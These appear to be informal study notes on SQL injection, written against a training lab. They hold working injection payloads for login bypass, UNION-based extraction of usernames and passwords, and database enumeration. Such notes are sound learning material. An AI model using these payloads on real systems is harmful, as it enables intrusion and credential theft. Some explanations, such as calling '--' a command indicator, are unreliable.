SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
This allows attacker to view data that they are not normally able to retrieve them.




1. How to detect SQLi
  1. add a single quote character ' and look for anomalies
  2. boolean conditions such as OR 1=1, OR 1=2
  3. some payloads trigger time delays
  4. or just use Burp suite




2. Where are the most vulnerabilities
  You ca nfind them at :
  WHERE clause of a SELECT
  UPDATE statements
  INSERT statements
  SELECT statements or in ORDER BY




3. Retrieving hidden data
  1. Example website              https://insecure-website.com/products?category=Gifts
  This cause a SQL query like this: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
  
So released=1 is used to show only objects that are released. You can assume that puting this to 0 expose some items.
  Now you can try something like: https://insecure-website.com/products?category=Gifts'--
  and that triggers:                SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

!!! The -- in sql is a command indicator !!! So the rest of query will be a comment, so in this example it will not check for released=1.

https://insecure-website.com/products?category=Gifts'+OR+1=1--
this will trigger:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
that checks if category is gifts OR 1=1, which always true, so will give all items.

!!! be carefull with OR, you might hit a DELETE !!!




4. Subverting apps logic
A application lets a user named wiener log in with pass bluecheese, the sql query is something like:
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

So you can try to comment the second part of check:
use name administrator'--
and the query is:    SELECT * FROM users WHERE username = 'administrator'--' AND password = ''




5. SQL injection UNION attacks (like logical AND)
when the results of a query are returned within application's responses, you can use the UNION keyword to retrive data.
The UNION keyword enables you to execute on or more SELECT queries.
For example:     SELECT a, b FROM table1 UNION SELECT c, d FROM table2

For UNION to work:
The individual queries must return the same number of columns.
The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
How many columns are being returned from the original query.
Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
So you try those one be one:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
The one that stops working will give:
The ORDER BY position number 3 is out of range of the number of items in the select list.

or try:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
and get:
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.




6. Database-specific MySQL or Oracle syntax
  in Oracle there is DUAL that you have to use lik this: ' UNION SELECT NULL FROM DUAL--
  in MySQL you can use -- but you need a space after, or you ca nuse the hash character #.




7. Find a string in UNION
  so now that you found how many columns there is with UNION, you need to find the exact column you need. So you use those:
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

if there is an error you will get:  Conversion failed when converting the varchar value 'a' to data type int.
!!! you can put whole strings not only 'a' !!!




8. SQL injection UNION attack to retrieve usefull data
You need to know the number of columns,the tables and the original query like:  
' UNION SELECT username, password FROM users--




9. Retrieving multiple values within a single colimn
  +In Oracle use || as a pipe, for example:   ' UNION SELECT username || '~' || password FROM users--
  it will return something like admin~1234
  +In Microsoft use +
  +In PostgreSQL use ||
  +In MySQL use "space" or CONCAT('foo','bar')

10. The steps you do
  1. burp suite
  2. find the number of columns
  3. find where is the data strings (for example: '+UNION+SELECT+NULL,'abc'--)
  4. '+UNION+SELECT+NULL,username||'~'||password+FROM+users--



11. Examine database
  The type/version of database software
  The tables/columns

For first (type/version) use those:
  Database type	    Query
  Microsoft, MySQL	SELECT @@version
  Oracle	          SELECT * FROM v$version
  PostgreSQL	      SELECT version()

  for example:       ' UNION SELECT @@version--
  

Keep in mind that url needs to be url encoded liek this: %27+UNION+SELECT+@@version,+NULL%23
where %23 = #
%27 = '




12. All tables:
  SELECT * FROM information_schema.tables
  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
